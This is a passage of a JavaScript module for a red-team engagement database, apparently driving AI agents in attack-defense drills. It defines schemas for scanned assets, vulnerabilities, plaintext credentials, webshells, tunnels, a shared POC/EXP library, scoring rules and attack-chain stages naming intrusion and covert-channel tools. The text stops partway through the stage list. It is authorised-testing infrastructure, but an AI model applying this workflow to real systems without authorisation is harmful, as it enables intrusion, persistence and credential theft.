/**
 * RedTeam 资产库核心（无 Cordis 依赖）
 *
 * 这里只做三件事：靶标工作区（目录 + 元数据）、SQLite 事实库（schema/写入/查询）、
 * 提示词与技能库的文件读写。Cordis 插件壳在 ./index.js，命令行壳在 ../bin/cli.mjs；
 * 两者共用本模块，保证「界面看到的」「智能体查到的」「命令行验的」是同一份实现。
 */
import { DatabaseSync } from 'node:sqlite'
import { connect as tcpConnect } from 'node:net'
import { createHash } from 'node:crypto'
import { homedir } from 'node:os'
import {
  mkdirSync, readFileSync, writeFileSync, readdirSync, existsSync, rmSync, statSync,
  copyFileSync,
} from 'node:fs'
import { join, basename, isAbsolute } from 'node:path'

const nowIso = () => new Date().toISOString()

/* ------------------------------------------------------------------ 通用 */

export function slugify(name) {
  const s = String(name || '').trim().toLowerCase()
    .replace(/[^\p{L}\p{N}]+/gu, '-')
    .replace(/^-+|-+$/g, '')
  return s || 'engagement'
}

const ipToInt = (ip) => ip.split('.').reduce((n, o) => (n * 256 + Number(o)) >>> 0, 0)
const cidrOf = (ip) => ip.split('.').slice(0, 3).join('.') + '.0/24'

const ROLE_TITLES = {
  recon: '信息收集',
  'vuln-scan': '漏洞检测',
  exploit: '漏洞利用',
  internal: '内网渗透',
}

/** 漏洞严重级（按展示优先级排列）。 */
const SEVERITIES = ['critical', 'high', 'medium', 'low', 'info']

/** 漏洞处置状态。 */
const VULN_STATUSES = ['candidate', 'confirmed', 'false-positive', 'exploited', 'fixed']

export { ROLE_TITLES, SEVERITIES, VULN_STATUSES }

/* ------------------------------------------------------------------ schema */

const DDL = `
PRAGMA journal_mode = WAL;
PRAGMA foreign_keys = ON;
PRAGMA busy_timeout = 5000;

CREATE TABLE IF NOT EXISTS scan_run (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  agent_session_id TEXT, tool TEXT, argv TEXT,
  started_at TEXT, finished_at TEXT, status TEXT DEFAULT 'running'
);

CREATE TABLE IF NOT EXISTS segment (
  cidr TEXT PRIMARY KEY, ip_start TEXT, ip_end TEXT,
  org TEXT, asn TEXT, country TEXT, city TEXT,
  source TEXT, first_seen TEXT, last_seen TEXT
);

CREATE TABLE IF NOT EXISTS asset (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  segment_cidr TEXT NOT NULL, ip TEXT NOT NULL, ip_int INTEGER,
  state TEXT DEFAULT 'unknown', primary_name TEXT, confidence REAL,
  first_seen TEXT, last_seen TEXT,
  test_status TEXT DEFAULT 'untested', test_notes TEXT, test_surface TEXT,
  test_updated_at TEXT, test_updated_by TEXT, blocked_count INTEGER DEFAULT 0,
  priority TEXT, potential TEXT, assess_reason TEXT, assessed_at TEXT, assessed_by TEXT,
  UNIQUE(segment_cidr, ip)
);

CREATE TABLE IF NOT EXISTS asset_name (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  asset_id INTEGER NOT NULL, name TEXT NOT NULL, kind TEXT,
  provenance TEXT, tool TEXT, first_seen TEXT, last_seen TEXT,
  UNIQUE(asset_id, name, kind)
);

CREATE TABLE IF NOT EXISTS port (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  asset_id INTEGER NOT NULL, proto TEXT DEFAULT 'tcp', port INTEGER NOT NULL,
  state TEXT DEFAULT 'open', provenance TEXT, tool TEXT, banner TEXT,
  url TEXT, title TEXT,
  first_seen TEXT, last_seen TEXT,
  UNIQUE(asset_id, proto, port)
);

CREATE TABLE IF NOT EXISTS service (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  port_id INTEGER NOT NULL, name TEXT, product TEXT, version TEXT, cpe TEXT,
  provenance TEXT, tool TEXT, first_seen TEXT, last_seen TEXT
);

CREATE TABLE IF NOT EXISTS fingerprint (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  asset_id INTEGER NOT NULL, port_id INTEGER,
  category TEXT, vendor TEXT, product TEXT, version TEXT,
  evidence TEXT, confidence REAL, provenance TEXT, tool TEXT,
  first_seen TEXT, last_seen TEXT
);

CREATE TABLE IF NOT EXISTS observation (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  entity_kind TEXT NOT NULL, entity_id INTEGER NOT NULL,
  attr TEXT, value TEXT, provenance TEXT, tool TEXT,
  scan_run_id INTEGER, collected_at TEXT, raw_ref TEXT
);

CREATE TABLE IF NOT EXISTS edge (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  src_kind TEXT NOT NULL, src_id TEXT NOT NULL,
  dst_kind TEXT NOT NULL, dst_id TEXT NOT NULL,
  relation TEXT NOT NULL, confidence REAL, scan_run_id INTEGER,
  first_seen TEXT, last_seen TEXT,
  UNIQUE(src_kind, src_id, dst_kind, dst_id, relation)
);

CREATE TABLE IF NOT EXISTS tag (
  entity_kind TEXT NOT NULL, entity_id INTEGER NOT NULL, tag TEXT NOT NULL,
  note TEXT, created_by TEXT, created_at TEXT,
  PRIMARY KEY (entity_kind, entity_id, tag)
);

CREATE TABLE IF NOT EXISTS vuln (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  asset_id INTEGER, port_id INTEGER, cve TEXT, title TEXT, severity TEXT,
  source TEXT, confidence REAL, status TEXT, evidence TEXT, target TEXT,
  found_by_agent TEXT, found_at TEXT
);

/* 得分点：来自攻防演练得分规则，用户可编辑（分值、启用、分类） */
CREATE TABLE IF NOT EXISTS score_point (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  code TEXT UNIQUE,
  name TEXT NOT NULL,
  category TEXT,
  points INTEGER DEFAULT 0,
  max_hits INTEGER DEFAULT 1,
  description TEXT,
  enabled INTEGER DEFAULT 1,
  sort_order INTEGER DEFAULT 0,
  created_at TEXT, updated_at TEXT
);

/* 得分记录：某个得分点在某个目标上被拿下 */
/* 作战阶段：全链路攻击路径图的五个阶段（内容可编辑） */
CREATE TABLE IF NOT EXISTS stage (
  code TEXT PRIMARY KEY,
  name TEXT NOT NULL,
  subtitle TEXT,
  color TEXT,
  goal TEXT,
  sections TEXT,
  tools TEXT,
  transition TEXT,
  sort_order INTEGER DEFAULT 0,
  updated_at TEXT
);

CREATE TABLE IF NOT EXISTS score_hit (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  point_id INTEGER NOT NULL,
  asset_id INTEGER, vuln_id INTEGER, step_id INTEGER, target TEXT,
  evidence TEXT, note TEXT,
  self_created INTEGER DEFAULT 0,
  recorded_by TEXT, recorded_at TEXT
);

/* 凭据：secret_value 存明文口令/密钥（面板直接显示，便于随时复用），secret_ref 指向 runs/ 下的证据文件。
   注意：本库只在本机，禁止把库文件或导出内容提交到任何仓库。 */
CREATE TABLE IF NOT EXISTS credential (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  asset_id INTEGER, host TEXT, username TEXT, secret_type TEXT,
  secret_value TEXT, secret_ref TEXT,
  privilege TEXT, source TEXT, tool TEXT, note TEXT,
  found_by_agent TEXT, found_at TEXT,
  UNIQUE(host, username, secret_type)
);

/* 访问会话：拿到入口后的一次可控访问记录（横向移动的起点） */
CREATE TABLE IF NOT EXISTS access_session (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  asset_id INTEGER, host TEXT, username TEXT, method TEXT, privilege TEXT,
  session_ref TEXT, note TEXT, found_by_agent TEXT, obtained_at TEXT
);

/* WebShell：已经上线的可控入口。智能体随时可以复用，避免"打到最后忘了还有 webshell" */
CREATE TABLE IF NOT EXISTS webshell (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  asset_id INTEGER, url TEXT NOT NULL, shell_type TEXT, pass_key TEXT,
  secret_ref TEXT, privilege TEXT,
  status TEXT DEFAULT 'unknown', last_check TEXT, check_note TEXT, latency_ms INTEGER,
  note TEXT, found_by_agent TEXT, created_at TEXT, updated_at TEXT,
  UNIQUE(url, pass_key)
);

/* 内网隧道：suo5 / socks5 / ssh -R / frp 等。记录入口、监听地址与可达网段 */
CREATE TABLE IF NOT EXISTS tunnel (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  asset_id INTEGER, webshell_id INTEGER, kind TEXT, listen TEXT,
  entry TEXT, reach TEXT,
  entry_kind TEXT,
  status TEXT DEFAULT 'unknown', last_check TEXT, check_note TEXT, latency_ms INTEGER,
  pid TEXT, command TEXT, note TEXT, found_by_agent TEXT, created_at TEXT, updated_at TEXT
);

/* HTTP 证据：原始请求/响应，可直接粘贴进 Burp Suite / Yakit 复现 */
CREATE TABLE IF NOT EXISTS http_evidence (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  vuln_id INTEGER, asset_id INTEGER, label TEXT,
  method TEXT, url TEXT, status INTEGER,
  request TEXT, response TEXT, note TEXT,
  captured_by TEXT, captured_at TEXT
);

/* 攻击文件：针对某个目标实际生效的脚本/POC/EXP（只收录验证有效的） */
CREATE TABLE IF NOT EXISTS attack_file (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  target TEXT NOT NULL, target_kind TEXT, name TEXT NOT NULL, kind TEXT,
  path TEXT NOT NULL, description TEXT, evidence TEXT,
  asset_id INTEGER, vuln_id INTEGER, created_by TEXT, created_at TEXT,
  UNIQUE(target, name)
);

/* 攻击链步骤：人工/智能体记录的链路节点，用于攻击链页面与报告 */
CREATE TABLE IF NOT EXISTS attack_step (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  seq INTEGER, stage TEXT, title TEXT, detail TEXT,
  asset_id INTEGER, vuln_id INTEGER, access_id INTEGER, point_id INTEGER,
  evidence_ref TEXT, recorded_by TEXT, recorded_at TEXT
);

CREATE VIRTUAL TABLE IF NOT EXISTS asset_fts USING fts5(
  asset_id UNINDEXED, ip, names, banners, titles, fingerprints
);

CREATE INDEX IF NOT EXISTS ix_asset_segment ON asset(segment_cidr);
CREATE INDEX IF NOT EXISTS ix_asset_ip_int ON asset(ip_int);
CREATE INDEX IF NOT EXISTS ix_port_asset ON port(asset_id);
CREATE INDEX IF NOT EXISTS ix_port_port ON port(port);
CREATE INDEX IF NOT EXISTS ix_service_port ON service(port_id);
CREATE INDEX IF NOT EXISTS ix_service_name ON service(name, product, version);
CREATE INDEX IF NOT EXISTS ix_fp_asset ON fingerprint(asset_id);
CREATE INDEX IF NOT EXISTS ix_fp_product ON fingerprint(product, version);
CREATE INDEX IF NOT EXISTS ix_edge_src ON edge(src_kind, src_id);
CREATE INDEX IF NOT EXISTS ix_edge_dst ON edge(dst_kind, dst_id);
CREATE INDEX IF NOT EXISTS ix_obs_entity ON observation(entity_kind, entity_id);
CREATE INDEX IF NOT EXISTS ix_vuln_asset ON vuln(asset_id);
CREATE INDEX IF NOT EXISTS ix_vuln_sev ON vuln(severity, status);
CREATE INDEX IF NOT EXISTS ix_vuln_cve ON vuln(cve);
CREATE INDEX IF NOT EXISTS ix_cred_host ON credential(host);
CREATE INDEX IF NOT EXISTS ix_access_host ON access_session(host);
CREATE INDEX IF NOT EXISTS ix_webshell_status ON webshell(status);
CREATE INDEX IF NOT EXISTS ix_tunnel_status ON tunnel(status);
CREATE INDEX IF NOT EXISTS ix_http_vuln ON http_evidence(vuln_id);
CREATE INDEX IF NOT EXISTS ix_http_asset ON http_evidence(asset_id);
CREATE INDEX IF NOT EXISTS ix_step_seq ON attack_step(seq, id);
CREATE INDEX IF NOT EXISTS ix_attack_target ON attack_file(target);
CREATE INDEX IF NOT EXISTS ix_score_hit_point ON score_hit(point_id);
CREATE INDEX IF NOT EXISTS ix_score_hit_asset ON score_hit(asset_id);

CREATE VIEW IF NOT EXISTS v_asset_summary AS
SELECT a.id, a.ip, a.segment_cidr, a.state, a.primary_name, a.first_seen, a.last_seen,
  (SELECT COUNT(*) FROM port p WHERE p.asset_id = a.id AND p.state = 'open') AS open_ports,
  (SELECT COUNT(*) FROM observation o WHERE o.entity_kind = 'asset' AND o.entity_id = a.id AND o.provenance = 'passive') AS passive_signals,
  (SELECT COUNT(*) FROM observation o WHERE o.entity_kind = 'asset' AND o.entity_id = a.id AND o.provenance = 'active') AS active_signals
FROM asset a;

CREATE VIEW IF NOT EXISTS v_asset_service AS
SELECT p.asset_id, p.port, p.proto, p.provenance AS port_provenance,
       s.name AS service, s.product, s.version, s.provenance AS service_provenance
FROM port p LEFT JOIN service s ON s.port_id = p.id;
`

/* ------------------------------------------------------------------ 知识库（POC/EXP，全局共享） */

/**
 * 知识库与靶标库分开：**通用可复用的 POC/EXP 跨靶标共享**，所以放独立的
 * `knowledge.db` + `pocs/` 目录，不挂在某个 engagements/<靶标>/ 下面。
 * 靶标专属、不可复用的脚本仍走 attack_file（攻击文件页）。
 */
const KNOWLEDGE_DDL = `
CREATE TABLE IF NOT EXISTS poc (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  code TEXT NOT NULL,                -- 稳定标识（slug），智能体可直接引用
  title TEXT NOT NULL,
  kind TEXT,                         -- poc | exp | script | template | payload
  cve TEXT,                          -- CVE / CNVD / 厂商编号
  component TEXT,                    -- 组件/产品（Weblogic、Shiro、泛微 OA…）
  versions TEXT,                     -- 影响版本
  severity TEXT,
  language TEXT,                     -- python | go | java | bash | http | nuclei | js | php
  source TEXT,                       -- web | self | manual | nuclei-template | kb
  source_url TEXT,
  description TEXT,
  usage TEXT,                        -- 用法/命令行示例
  content TEXT,                      -- 正文（脚本 / POC / 原始请求）
  path TEXT,                         -- 落盘位置（pocs/<code>/<file>），便于智能体直接 cat
  verified INTEGER DEFAULT 0,        -- 是否实测验证过
  verified_note TEXT,                -- 验证证据（哪台目标、什么回显）
  hit_count INTEGER DEFAULT 0,       -- 被复用次数
  used_on TEXT,                      -- 最近一次使用在哪个靶标/目标
  tags TEXT,
  created_by TEXT, created_at TEXT, updated_at TEXT,
  UNIQUE(code)
);
CREATE INDEX IF NOT EXISTS ix_poc_cve ON poc(cve);
CREATE INDEX IF NOT EXISTS ix_poc_component ON poc(component);
CREATE INDEX IF NOT EXISTS ix_poc_kind ON poc(kind, verified);
CREATE VIRTUAL TABLE IF NOT EXISTS poc_fts USING fts5(
  poc_id UNINDEXED, title, cve, component, versions, tags, description, content
);
`

/* ------------------------------------------------------------------ 判定规则 */

/**
 * 什么算"真隧道"（算边界突破/内网突破的凭证）：**必须跨越了靶标边界**，
 * 即通道的一端在目标侧。三种情况：
 *   · target-outbound：目标主动连出到我的服务器（反弹 shell 落地、目标上跑 frp/Stowaway 客户端）
 *   · target-http：经目标 WebShell/HTTP 通道（suo5、Neo-ReGeorg、reGeorg、自研 HTTP 隧道）
 *   · target-agent：经目标上已控进程/会话转发的隧道（SSH -R 由目标发起等）
 * 不算的：self-only —— 只在自己 VPS / 自建服务器上开的代理或服务端，没碰到目标。
 */
const TUNNEL_ENTRY_KINDS = {
  'target-outbound': '目标主动连出（反弹 shell / 目标上跑 frp 客户端）',
  'target-http': '经目标 WebShell/HTTP 通道（suo5 / Neo-ReGeorg）',
  'target-agent': '经目标已控进程/会话转发（SSH -R 等）',
  'self-only': '只在自己 VPS/自建服务器上（不算突破）',
}
export { TUNNEL_ENTRY_KINDS }

/** 这条隧道算不算"跨越了靶标边界"。未声明（老数据/没填）返回 null，界面按"待确认"显示。 */
export function tunnelIsLegit(entryKind) {
  const k = String(entryKind || '').trim()
  if (k === '') return null
  return k !== 'self-only'
}

/**
 * 账号/权限类得分点：**自己注册、自己创建的账号不算拿到权限**（演练得分针对"拿到别人已有的"）。
 * 这些得分点命中时会要求声明 self_created，避免把自助注册当成战果。
 */
const ACCOUNT_POINT_CODES = ['web-account-user', 'web-account-admin', 'server-shell', 'db-access', 'internal-pivot', 'core-system']
export { ACCOUNT_POINT_CODES }

/* ------------------------------------------------------------------ 知识库常量 */

/** POC 类型：poc=验证性利用、exp=可执行利用、template=nuclei 等模板、script=辅助脚本、payload=载荷。 */
const POC_KINDS = ['poc', 'exp', 'script', 'template', 'payload']
/** 来源：web=互联网扒的、self=智能体手搓、manual=人写的、nuclei-template=模板库。 */
const POC_SOURCES = ['web', 'self', 'manual', 'nuclei-template', 'kb']
export { POC_KINDS, POC_SOURCES }

/** 生成知识库条目的稳定标识：组件 + 编号/标题，便于智能体直接引用。 */
export function slugPoc(title, cve) {
  const t = String(title || '').trim()
  const c = String(cve || '').trim()
  /* 标题里往往已经写了 CVE，别再拼一遍（否则 code 会变成 xxx-cve-2023-21839-cve-2023-21839） */
  const flat = (s) => String(s).toLowerCase().replace(/[^a-z0-9]/g, '')
  const base = (c !== '' && !flat(t).includes(flat(c))) ? c + ' ' + t : t
  const slug = base.toLowerCase()
    .replace(/cve[-_ ]?(\d{4})[-_ ]?(\d+)/g, 'cve-$1-$2')
    .replace(/[^\w\u4e00-\u9fa5.-]+/g, '-')
    .replace(/-{2,}/g, '-')
    .replace(/^-+|-+$/g, '')
    .slice(0, 80)
    .replace(/-+$/, '')
  return slug === '' ? 'poc-' + Date.now() : slug
}

/** 按语言给正文一个合适的文件名（智能体可以直接照着运行）。 */
function defaultPocFilename(title, kind, language) {
  const ext = {
    python: 'py', py: 'py', go: 'go', java: 'java', bash: 'sh', sh: 'sh', shell: 'sh',
    js: 'js', node: 'js', php: 'php', ruby: 'rb', powershell: 'ps1', http: 'http', nuclei: 'yaml', yaml: 'yaml',
  }[String(language || '').toLowerCase()]
  if (ext) return 'poc.' + ext
  if (kind === 'template') return 'poc.yaml'
  return 'poc.txt'
}

/* ------------------------------------------------------------------ 目标命名 */
/**
 * 把目标（IP / URL / C 段）归一化成攻击文件目录名。
 *  · IP 或 ip:port → 只取 IP（同一 IP 的多个端口归一个文件夹）
 *  · URL → 只取 host（去掉协议、端口、路径）
 *  · C 段 10.0.0.0/24 → 10.0.0.0_24
 */
export function slugTarget(target) {
  const raw = String(target || '').trim()
  if (raw === '') return 'unknown'
  const ipMatch = /^(\d{1,3}(?:\.\d{1,3}){3})(?::\d+)?$/.exec(raw)
  if (ipMatch !== null) return ipMatch[1]
  const urlMatch = /^https?:\/\/([^/?#]+)/i.exec(raw)
  const hostPort = urlMatch !== null ? urlMatch[1] : raw
  const host = hostPort.replace(/:(\d+)$/, '')
  return host.replace(/[^\w.\-]/g, '_').replace(/_+$/, '') || 'unknown'
}

/* ------------------------------------------------------------------ 迁移 */

/**
 * 轻量迁移：给既有库补列。先查 PRAGMA 再 ADD COLUMN，重复执行安全。
 * 只在新增列时执行，因此老靶标库不需要重建。
 */
function migrate(db) {
  const has = (table, column) => {
    try {
      return db.prepare(`PRAGMA table_info(${table})`).all().some((row) => row.name === column)
    } catch {
      return true
    }
  }
  const ensure = (table, column, ddl) => {
    if (has(table, column)) return false
    try { db.exec(`ALTER TABLE ${table} ADD COLUMN ${column} ${ddl}`) } catch { /* 并发迁移时忽略 */ }
    return true
  }
  ensure('vuln', 'target', 'TEXT')
  ensure('vuln', 'found_by_agent', 'TEXT')
  ensure('vuln', 'found_at', 'TEXT')
  ensure('port', 'url', 'TEXT')
  ensure('port', 'title', 'TEXT')
  ensure('asset', 'test_status', "TEXT DEFAULT 'untested'")
  ensure('asset', 'test_notes', 'TEXT')
  ensure('asset', 'test_surface', 'TEXT')
  ensure('asset', 'test_updated_at', 'TEXT')
  ensure('asset', 'test_updated_by', 'TEXT')
  ensure('asset', 'blocked_count', 'INTEGER DEFAULT 0')
  ensure('asset', 'priority', 'TEXT')
  ensure('asset', 'potential', 'TEXT')
  ensure('asset', 'assess_reason', 'TEXT')
  ensure('asset', 'assessed_at', 'TEXT')
  ensure('asset', 'assessed_by', 'TEXT')
  /* 内外网维度：internal（内网/私网地址）| external（互联网可达）。手工指定优先于自动推导 */
  ensure('asset', 'scope', 'TEXT')
  /* 通过这个漏洞拿到了什么：账号权限 / 服务器权限 / 内网隧道 / 得分点等 */
  ensure('vuln', 'gained', 'TEXT')
  /* 凭据明文：面板要直接显示口令，不再只存引用（库在本机，禁止导出/提交） */
  ensure('credential', 'secret_value', 'TEXT')
  /* 得分类别不设数量上限（max_hits 列保留只为兼容老库结构，计分不再使用） */
  /* 得分 ↔ 漏洞/步骤 关联：报告取原始请求、流程图连线用 */
  ensure('score_hit', 'vuln_id', 'INTEGER')
  ensure('score_hit', 'step_id', 'INTEGER')
  ensure('attack_step', 'point_id', 'INTEGER')
  /* 攻击链已推倒重来：老的五阶段行整体作废，attck 列移除 */
  try {
    /* 注意：'target' 在新老两版里同名，必须按名称区分，否则第二次打开会把新版阶段删掉 */
    db.prepare("DELETE FROM stage WHERE code IN ('external','foothold','tunnel','privilege')").run()
    db.prepare("DELETE FROM stage WHERE code = 'target' AND name = '靶标系统权限'").run()
    db.prepare("DELETE FROM stage WHERE code NOT IN ('recon','internet','boundary','internal','target')").run()
  } catch { /* 表还不存在，忽略 */ }
  if (has('stage', 'attck')) {
    try { db.exec('ALTER TABLE stage DROP COLUMN attck') } catch { /* 老 SQLite 不支持则保留 */ }
  }
  /* 攻击步骤上的阶段：老值是上一版的阶段 code，清掉以便按 legacy stage 重新映射。
     注意：'target' 在新版里仍是合法阶段（⑤ 靶标权限），不能一起清——否则每次打开
     靶标都会把「显式指定 ⑤」的步骤与得分打回自动推导。 */
  try {
    db.prepare("UPDATE attack_step SET stage_code = NULL WHERE stage_code IN ('external','foothold','tunnel','privilege')").run()
    db.prepare("UPDATE score_hit SET stage_code = NULL WHERE stage_code IN ('external','foothold','tunnel','privilege')").run()
  } catch { /* 忽略 */ }
  /* 阶段归属改为按每条得分自动推导，得分点上的 stage_code 已废弃 */
  if (has('score_point', 'stage_code')) {
    try { db.exec('ALTER TABLE score_point DROP COLUMN stage_code') } catch { /* 忽略 */ }
  }
  /* 蓝队视角已从作战阶段中移除：老库把这一列删掉（失败则忽略，不影响使用） */
  if (has('stage', 'blue_team')) {
    try { db.exec('ALTER TABLE stage DROP COLUMN blue_team') } catch { /* 老 SQLite 不支持则保留 */ }
  }
  /* 阶段归属：得分命中可显式覆盖（默认自动推导）；攻击步骤记录所属阶段 */
  ensure('score_hit', 'stage_code', 'TEXT')
  /* 自建账号标记：自己注册/自己创建的账号不算得分权限，只作过程记录（老数据默认 0） */
  ensure('score_hit', 'self_created', 'INTEGER DEFAULT 0')
  /* 隧道入口归属：判断这条通道有没有真的跨越靶标边界（self-only 不算突破） */
  ensure('tunnel', 'entry_kind', 'TEXT')
  if (ensure('attack_step', 'stage_code', 'TEXT')) {
    try {
      const stmt = db.prepare('UPDATE attack_step SET stage_code = ? WHERE stage = ?')
      for (const [legacy, code] of Object.entries(LEGACY_STAGE_MAP)) stmt.run(code, legacy)
    } catch { /* 忽略 */ }
  }
  /* 老库回填：按 IP 归属自动区分内外网 */
  try {
    db.exec(`UPDATE asset SET scope = (${SCOPE_SQL}) WHERE scope IS NULL OR scope = ''`)
  } catch { /* 首次建库时表为空，忽略 */ }
}

/**
 * 目标归并：同一条漏洞的 target 可能带路径/参数（http://h:8080/a/b、10.0.0.5:6379），
 * 聚合视图要按「站点/服务」而不是按完整 URL 分组，否则 300 条漏洞会聚成 300 组。
 */
export function targetKey(target, fallbackIp) {
  const t = String(target || '').trim()
  if (t !== '') {
    const url = /^([a-z][a-z0-9+.-]*:\/\/[^/?#\s]+)/i.exec(t)
    if (url !== null) return url[1]
    const head = /^([^\s/?#]+)/.exec(t)
    if (head !== null) return head[1]
    return t
  }
  return fallbackIp || '(未指定目标)'
}

/** 安全解析 JSON 列（坏数据回退默认值）。 */
const parseJson = (value, fallback) => {
  try {
    const parsed = JSON.parse(value)
    return parsed === null || parsed === undefined ? fallback : parsed
  } catch { return fallback }
}

/** 把「通过这个漏洞拿到了什么」规范化成一行短标签：数组或分隔串 → 「A、B」。 */
function normGained(value) {
  if (value === undefined || value === null) return null
  const parts = Array.isArray(value) ? value : String(value).split(/[,;，；]/)
  const out = parts.map((x) => String(x).trim()).filter(Boolean)
  return out.length > 0 ? out.join('、') : null
}

/**
 * 内外网判定（SQL 片段，作用于 asset.ip）：
 * RFC1918 私网 + 回环 + 链路本地 + CGNAT 视为内网，其余为外网。
 */
const SCOPE_SQL = `CASE
  WHEN ip LIKE '10.%' OR ip LIKE '192.168.%' OR ip LIKE '127.%' OR ip LIKE '169.254.%'
    OR (ip LIKE '172.%' AND CAST(substr(ip, 5, instr(substr(ip, 5), '.') - 1) AS INTEGER) BETWEEN 16 AND 31)
    OR (ip LIKE '100.%' AND CAST(substr(ip, 5, instr(substr(ip, 5), '.') - 1) AS INTEGER) BETWEEN 64 AND 127)
  THEN 'internal' ELSE 'external' END`

/** JS 侧同样的判定，用于写入新资产时即时打标。 */
export function scopeOfIp(ip) {
  const s = String(ip || '')
  if (/^(10\.|192\.168\.|127\.|169\.254\.)/.test(s)) return 'internal'
  const m = /^172\.(\d{1,3})\./.exec(s)
  if (m !== null) {
    const n = Number(m[1])
    if (n >= 16 && n <= 31) return 'internal'
  }
  const c = /^100\.(\d{1,3})\./.exec(s)
  if (c !== null) {
    const n = Number(c[1])
    if (n >= 64 && n <= 127) return 'internal'
  }
  return 'external'
}

/* ------------------------------------------------------------------ 元数据 */

function readMeta(path) {
  if (!existsSync(path)) return undefined
  const out = {}
  for (const line of readFileSync(path, 'utf8').split('\n')) {
    const m = /^([A-Za-z_][A-Za-z0-9_]*):\s*(.*)$/.exec(line)
    if (!m) continue
    const v = m[2].trim()
    if (v.startsWith('[') && v.endsWith(']')) {
      out[m[1]] = v.slice(1, -1).split(',').map((x) => x.trim().replace(/^["']|["']$/g, '')).filter(Boolean)
    } else {
      out[m[1]] = v.replace(/^["']|["']$/g, '')
    }
  }
  return out
}

function writeMeta(path, meta) {
  const lines = []
  for (const [k, v] of Object.entries(meta)) {
    if (Array.isArray(v)) lines.push(`${k}: [${v.join(', ')}]`)
    else if (v !== undefined && v !== null) lines.push(`${k}: ${v}`)
  }
  writeFileSync(path, lines.join('\n') + '\n', 'utf8')
}


/* ------------------------------------------------------------------ 默认得分点 */

/** 攻防演练默认得分点（用户可在「得分目标」面板里编辑分值/启用/增删）。 */
export const DEFAULT_SCORE_POINTS = [
  { code: 'web-account-user', name: '获取 Web 普通账号权限', category: '账号权限', points: 10, description: '拿到任意站点/系统的普通用户账号（注册、撞库、越权、短信绕过等）' },
  { code: 'web-account-admin', name: '获取 Web 管理员账号权限', category: '账号权限', points: 20, description: '拿到后台/管理端管理员账号，可登录管理功能' },
  { code: 'webshell', name: '上传 WebShell 并维持访问', category: '服务器权限', points: 20, description: '落地可用 WebShell（冰蝎/哥斯拉/蚁剑可连）并稳定访问' },
  { code: 'rce', name: 'RCE / 命令执行', category: '服务器权限', points: 30, description: '在目标服务器执行任意命令（含框架/中间件 Nday RCE、反序列化、模板注入等）' },
  { code: 'server-shell', name: '获取服务器权限', category: '服务器权限', points: 25, description: '获得主机 Shell（反弹/交互式），可读写文件与执行命令' },
  { code: 'db-access', name: '获取数据库权限', category: '数据库', points: 25, description: '可读写目标数据库（注入拖库、暴露库弱口令、连接串泄露）' },
  { code: 'sensitive-data', name: '获取大量敏感信息', category: '数据', points: 20, description: '批量导出用户/订单/身份/配置/源码等敏感数据' },
  { code: 'boundary', name: '互联网边界突破', category: '网络突破', points: 30, description: '从互联网侧进入目标内网（VPN/网关/暴露服务被拿下并可达内网）' },
  { code: 'internal-pivot', name: '突破逻辑内网（横向移动）', category: '网络突破', points: 35, description: '以内网可达身份横向到其他主机/网段，扩大控制范围' },
  { code: 'core-system', name: '拿下核心系统', category: '核心目标', points: 40, description: '域控、堡垒机、运维平台、邮件/门户核心、代码仓库等关键系统' },
]

/* ------------------------------------------------------------------ 默认内容 */

/* ------------------------------------------------------------------ 攻击链（五阶段） */

/**
 * 攻击链的五个阶段：按「攻击面位置」串起来 —— 互联网侧收集 → 互联网侧拿权限 →
 * 打穿边界 → 内网拿权限 → 拿靶标。得分归属由 scoreStageOf() 自动推导。
 *
 * sections = 该阶段的打法要点（数据仍保留给提示词与面板编辑用；攻击链页面已不再展示，
 * 避免执行细节淹没"打到哪了、拿了多少分"）；tools = 常用工具。
 */
export const DEFAULT_STAGES = [
  {
    code: 'recon', name: '信息收集', subtitle: 'RECON · 互联网侧', color: '#06b6d4', scored: 0,
    goal: '在互联网侧展开信息收集，确定值得打的资产面',
    sections: [
      { label: '资产测绘', items: ['子域名 / C 段 / 端口指纹', 'FOFA、被动 DNS、证书透明、主动扫描'] },
      { label: '攻击面确认', items: ['Web 标题与指纹、暴露的服务与管理端口', '归属、WAF / CDN 识别'] },
      { label: '攻击面排序', items: ['按易打性与预期得分排序', '确定先打哪几台'] },
    ],
    tools: 'ARL / 灯塔、fscan、gogo、OneForAll、ENScan、Goby、Nmap、Burp、Nuclei',
    transition: '确认互联网攻击面，转入利用',
  },
  {
    code: 'internet', name: '互联网资产权限', subtitle: 'INTERNET-SIDE PRIVILEGE', color: '#ef4444', scored: 1,
    goal: '在互联网侧资产上拿到账号、权限等得分',
    sections: [
      { label: '拿账号', items: ['弱口令 / 越权 / 未授权 / 逻辑漏洞', '后台管理员、普通账号'] },
      { label: '拿权限', items: ['Nday / 1day RCE、文件上传、反序列化', 'WebShell、命令执行、服务器权限'] },
      { label: '拿数据', items: ['数据库、配置泄露、批量敏感信息'] },
    ],
    tools: 'sqlmap、Nuclei、冰蝎 / 哥斯拉 / 蚁剑、fscan、Burp、自定义 POC',
    transition: '用已控主机打通出网通道',
  },
  {
    code: 'boundary', name: '边界突破', subtitle: 'BOUNDARY BREACH · TUNNEL', color: '#f59e0b', scored: 1,
    goal: '成功搭建隧道，把控制能力延伸进内网',
    sections: [
      { label: '隧道', items: ['suo5 / frp / Stowaway / Neo-reGeorg / Venom', 'socks5 落地、多级级联'] },
      { label: '出网通道', items: ['域名前置、CDN 隐藏、云函数转发', 'DNS / ICMP / 443 隐蔽信道'] },
    ],
    tools: 'suo5、frp、Stowaway、Neo-reGeorg、GOST、proxychains、chisel',
    transition: '隧道就绪，转入内网',
  },
  {
